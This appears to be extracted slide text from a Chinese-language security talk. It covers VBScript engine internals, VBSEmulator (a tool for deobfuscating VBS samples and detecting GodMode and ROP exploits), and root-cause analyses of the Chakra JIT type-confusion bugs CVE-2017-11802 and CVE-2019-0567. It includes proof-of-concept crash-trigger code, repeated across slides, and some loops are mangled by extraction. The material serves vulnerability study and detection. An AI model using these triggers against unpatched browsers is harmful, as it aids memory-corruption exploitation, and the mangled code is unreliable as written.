} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
|this| 指针仍然保存在stack中，而不是由GC跟踪
获得一个悬挂指针
VBSEmulator
VBScript是什么
• Microsoft开发的一种脚本语言
• 不符合ECMAScript标准
• 在vbscript.dll中运行
• 不开源
vbscript.dll 如何工作
• Load
• Parse
• Compile
• Run
• Unload
vbscript.dll 如何工作
• Load
• Parse
• Compile
• Run
• Unload
CScriptRuntime::RunNoEH(CScriptRuntime *__hidden this, struct VAR *)
vbscript.dll 如何工作
• Load
• Parse
• Compile
• Run
• Unload
CScriptRuntime::RunNoEH(CScriptRuntime *__hidden this, struct VAR *)
CScriptRuntime
+0x28 Local Variables
+0x2C Function Arguments
+0xB0 Statck Pointer
+0xB4 Position Counter
+0xC0 CompiledScript
CompiledScript
+0x10 func_offset
+0x14 func_count
+0x1C bos_info
+0x28 bos_data
+0x2C bos_data_length
VBSEmulator 是什么
• 一个可以对vbs混淆的样本进行反混淆处理的工具
• 一个可以检测GodMode或ROP的工具
VBSEmulator 如何工作
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
VBSEmulator 如何工作
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Hook函数不会导出
•
需要维护一个Hook函数入口点模板
•
通过Hook LoadLibrary，可以使用特定的vbscript.dll
VBSEmulator 如何工作
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Exploit1: GodMode
VBSEmulator 如何工作
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Exploit2: ROP
VBSEmulator 如何工作
Hook LoadLibrary
Init COM
Run Script
Dump Behavior
Detect Exploit
Uninitialize
Start
Hook
Break out
Y
N
•
Detect Exploit1: GodMode
（1）Hook COleScript :: CanObjectRun
（2）检查安全模式标志是否被修改
（3）如果检测到，抛出异常并停止运行ActiveX
•
Detect Exploit2: ROP
（1）Hook ntdll！NtContinue
（2）检查CONTEXT.Eip == VirtualProtect
（3）如果检测到，抛出异常并停止运行shellcode
演示
Chakra
Chakra是什么
• 由Microsoft开发的JavaScript引擎
• 用于Microsoft Edge
• Fork自Internet Explorer中使用的Jscript9
• 在GitHub中开源：ChakraCore☺
Chakra 如何工作
• Parser
• Interpreter
• JIT compiler
• Garbage Collector
From: https://github.com/Microsoft/ChakraCore/wiki/Architecture-Overview
Chakra 基本变量类型
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Chakra 的基本变量类型
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
segment
Chakra的基本变量类型
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Chakra的基本变量类型
• Array
•
JavascriptArray
•
JavascriptNativeIntArray
•
JavascriptNativeFloatArray
Chakra的基本变量类型
• Array
•
Type Conversion in Array
arr[0] = {}; 
JavascriptNativeFloatArray
JavascriptArray
Chakra的基本变量类型
• Object
•
Memory layout of DynamicObject
var obj2 = {__proto__:obj1};
Chakra JIT Type Confusion 
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=chakra
Chakra JIT Type Confusion 
• 示例
function opt(obj) {
foo(obj);
}
for(let i=0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 : 根本原因分析
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Define one JavascriptFloatArray
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
强制对opt()进行JITed和优化
• 案例分析: CVE-2017-11802 : 根本原因分析
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
|replace| 会触发ImplicitCall 回调
• 案例分析: CVE-2017-11802 : 根本原因分析
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 : 根本原因分析
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
直接调用 opt() JITed 代码
Chakra JIT Type Confusion 
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
|replace| 会触发ImplicitCall 回掉
| arr[0]={}| 将数组类型从Javascript NativeFloat
Array更改为Javascript Array
• 案例分析: CVE-2017-11802 : 根本原因分析
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 :根本原因分析
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
JITed opt()仍然假设arr类型是JavascriptNativeFloatArray。
Type Confusion发生了！
opt JITed Code
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 :根本原因分析
let arr = [1.1, 1.2];
function opt(f) {
arr[0] = 1.1;
arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
return 1;
}
for (var i = 0; i {return '0';});
opt(()=>{ arr[0]={}; return '0';});
//trigger exception
arr[1].toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2017-11802
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 : 漏洞补丁
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 : 漏洞补丁
Chakra JIT Type Confusion 
• 案例分析: CVE-2017-11802 : 漏洞补丁
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; i<0x10000; i++)
opt(obj1, obj2);
opt(obj1, obj1);
//trigger exception
obj1.a.toString();
From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2019-0567
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 根本原因分析
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; i<0x10000; i++)
opt(obj1, obj2);
opt(obj1, obj1);
//trigger exception
obj1.a.toString();